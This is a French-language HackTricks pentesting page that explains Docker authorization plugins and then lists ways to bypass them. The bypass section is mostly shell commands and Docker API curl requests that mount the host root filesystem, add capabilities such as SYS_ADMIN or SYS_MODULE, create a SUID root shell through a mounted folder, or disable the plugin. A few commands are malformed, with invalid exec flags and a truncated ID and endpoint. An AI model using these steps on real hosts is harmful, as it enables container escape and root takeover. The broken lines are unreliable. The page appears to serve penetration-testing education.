<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


Le modèle d'**autorisation** par défaut de **Docker** est du type **tout ou rien**. Tout utilisateur ayant la permission d'accéder au démon Docker peut exécuter n'importe quelle commande client Docker. Il en va de même pour les appelants utilisant l'API Engine de Docker pour contacter le démon. Si vous avez besoin d'un **contrôle d'accès plus granulaire**, vous pouvez créer des **plugins d'autorisation** et les ajouter à la configuration de votre démon Docker. À l'aide d'un plugin d'autorisation, un administrateur Docker peut configurer des **politiques d'accès granulaires** pour gérer l'accès au démon Docker.

# Architecture de base

Les plugins d'authentification Docker sont des **plugins externes** que vous pouvez utiliser pour **autoriser/refuser** les **actions** demandées au démon Docker en fonction de l'utilisateur qui l'a demandé et de l'action demandée.

Lorsqu'une **requête HTTP** est effectuée sur le démon Docker via la CLI ou via l'API Engine, le **sous-système d'authentification** transmet la requête au(x) **plugin(s) d'authentification** installé(s). La requête contient l'utilisateur (appelant) et le contexte de commande. Le **plugin** est responsable de décider s'il faut **autoriser** ou **refuser** la demande.

Les diagrammes de séquence ci-dessous représentent un flux d'autorisation autorisé et refusé :

![Flux d'autorisation autorisé](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Flux d'autorisation refusé](https://docs.docker.com/engine/extend/images/authz\_deny.png)

Chaque demande envoyée au plugin **inclut l'utilisateur authentifié, les en-têtes HTTP et le corps de la demande/réponse**. Seul le **nom d'utilisateur** et la **méthode d'authentification** utilisée sont transmis au plugin. Plus important encore, **aucune** des **informations d'identification** ou des **jetons d'utilisateur** ne sont transmis. Enfin, **tous les corps de demande/réponse ne sont pas envoyés** au plugin d'autorisation. Seuls les corps de demande/réponse pour lesquels le `Content-Type` est soit `text/*` ou `application/json` sont envoyés.

Pour les commandes qui peuvent potentiellement détourner la connexion HTTP (`HTTP Upgrade`), telles que `exec`, le plugin d'autorisation n'est appelé que pour les requêtes HTTP initiales. Une fois que le plugin approuve la commande, l'autorisation n'est pas appliquée au reste du flux. En particulier, les données de streaming ne sont pas transmises aux plugins d'autorisation. Pour les commandes qui renvoient une réponse HTTP fragmentée, telles que `logs` et `events`, seule la requête HTTP est envoyée aux plugins d'autorisation.

Pendant le traitement de la demande/réponse, certains flux d'autorisation peuvent nécessiter des requêtes supplémentaires au démon Docker. Pour terminer de tels flux, les plugins peuvent appeler l'API du démon de manière similaire à un utilisateur régulier. Pour permettre ces requêtes supplémentaires, le plugin doit fournir les moyens à un administrateur de configurer des politiques d'authentification et de sécurité appropriées.

## Plusieurs plugins

Vous êtes responsable de **l'enregistrement** de votre **plugin** en tant que partie du **démarrage** du démon Docker. Vous pouvez installer **plusieurs plugins et les chaîner ensemble**. Cette chaîne peut être ordonnée. Chaque demande au démon passe dans l'ordre à travers la chaîne. Seulement lorsque **tous les plugins accordent l'accès** à la ressource, l'accès est accordé.

# Exemples de plugins

## Twistlock AuthZ Broker

Le plugin [**authz**](https://github.com/twistlock/authz) vous permet de créer un **fichier JSON** simple que le **plugin** va **lire** pour autoriser les demandes. Par conséquent, cela vous donne la possibilité de contrôler très facilement lesquels des points d'API peuvent être atteints par chaque utilisateur.

Voici un exemple qui permet à Alice et Bob de créer de nouveaux conteneurs : `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

Dans la page [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go), vous pouvez trouver la relation entre l'URL demandée et l'action. Dans la page [types.go](https://github.com/twistlock/authz/blob/master/core/types.go), vous pouvez trouver la relation entre le nom de l'action et l'action.

## Tutoriel de plugin simple

Vous pouvez trouver un **plugin facile à comprendre** avec des informations détaillées sur l'installation et le débogage ici : [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Lisez le fichier `README` et le code `plugin.go` pour comprendre comment cela fonctionne.

# Contournement du plugin d'authentification Docker

## Énumérer l'accès

Les principales choses à vérifier sont **lesquels des points d'extrémité sont autorisés** et **lesquelles des valeurs de HostConfig sont autorisées**.

Pour effectuer cette énumération, vous pouvez **utiliser l'outil** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**

## `run --privileged` non autorisé

### Privilèges minimums
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Exécution d'un conteneur puis obtention d'une session privilégiée

Dans ce cas, l'administrateur système **a interdit aux utilisateurs de monter des volumes et d'exécuter des conteneurs avec le drapeau `--privileged` ou de donner des capacités supplémentaires au conteneur** :
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Cependant, un utilisateur peut **créer un shell à l'intérieur du conteneur en cours d'exécution et lui donner des privilèges supplémentaires**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Maintenant, l'utilisateur peut s'échapper du conteneur en utilisant l'une des [**techniques précédemment discutées**](./#privileged-flag) et **élever les privilèges** à l'intérieur de l'hôte.

## Monter un dossier inscriptible

Dans ce cas, l'administrateur système a **interdit aux utilisateurs d'exécuter des conteneurs avec le drapeau `--privileged`** ou de donner des capacités supplémentaires au conteneur, et il a seulement autorisé le montage du dossier `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
 -p #This will give you a shell as root
```
{% hint style="info" %}
Notez que vous ne pouvez peut-être pas monter le dossier `/tmp`, mais vous pouvez monter un **dossier différent accessible en écriture**. Vous pouvez trouver des répertoires accessibles en écriture en utilisant la commande : `find / -writable -type d 2>/dev/null`

**Notez que tous les répertoires d'une machine Linux ne prendront pas en charge le bit suid !** Pour vérifier quels répertoires prennent en charge le bit suid, exécutez la commande `mount | grep -v "nosuid"`. Par exemple, généralement `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` et `/var/lib/lxcfs` ne prennent pas en charge le bit suid.

Notez également que si vous pouvez **monter `/etc`** ou tout autre dossier **contenant des fichiers de configuration**, vous pouvez les modifier depuis le conteneur Docker en tant que root pour **les exploiter sur l'hôte** et escalader les privilèges (peut-être en modifiant `/etc/shadow`).
{% endhint %}

## Point d'extrémité API non vérifié

La responsabilité de l'administrateur système configurant ce plugin serait de contrôler les actions et les privilèges que chaque utilisateur peut effectuer. Par conséquent, si l'administrateur prend une approche de **liste noire** avec les points d'extrémité et les attributs, il pourrait **oublier certains d'entre eux** qui pourraient permettre à un attaquant d'**escalader les privilèges**.

Vous pouvez vérifier l'API Docker sur [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Structure JSON non vérifiée

### Liens dans la racine

Il est possible que lorsque l'administrateur système a configuré le pare-feu Docker, il ait **oublié un paramètre important** de l' [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) comme "**Liens**".\
Dans l'exemple suivant, il est possible d'exploiter cette mauvaise configuration pour créer et exécuter un conteneur qui monte le dossier racine (/) de l'hôte :
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Notez comment dans cet exemple, nous utilisons le paramètre **`Binds`** en tant que clé de niveau racine dans le JSON, mais dans l'API, il apparaît sous la clé **`HostConfig`**
{% endhint %}

### Binds dans HostConfig

Suivez les mêmes instructions que pour **Binds dans root** en effectuant cette **requête** à l'API Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Montages dans la racine

Suivez les mêmes instructions que pour les **liens dans la racine** en effectuant cette **requête** à l'API Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Montages dans HostConfig

Suivez les mêmes instructions que pour les **liens dans root** en effectuant cette **requête** à l'API Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Attribut JSON non vérifié

Il est possible que lorsque l'administrateur système a configuré le pare-feu Docker, il ait **oublié un attribut important d'un paramètre de l'API** (https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) tel que "**Capabilities**" à l'intérieur de "**HostConfig**". Dans l'exemple suivant, il est possible d'exploiter cette mauvaise configuration pour créer et exécuter un conteneur avec la capacité **SYS\_MODULE** :
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
Le **`HostConfig`** est la clé qui contient généralement les **privilèges intéressants** pour s'échapper du conteneur. Cependant, comme nous l'avons discuté précédemment, notez que l'utilisation de **Binds** en dehors de celui-ci fonctionne également et peut vous permettre de contourner les restrictions.
{% endhint %}

## Désactivation du plugin

Si l'**administrateur système** a **oublié** d'**interdire** la possibilité de **désactiver** le **plugin**, vous pouvez en profiter pour le désactiver complètement !
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
N'oubliez pas de **réactiver le plugin après l'escalade**, sinon un **redémarrage du service docker ne fonctionnera pas**!

## Auth Plugin Bypass writeups

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

# Références

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
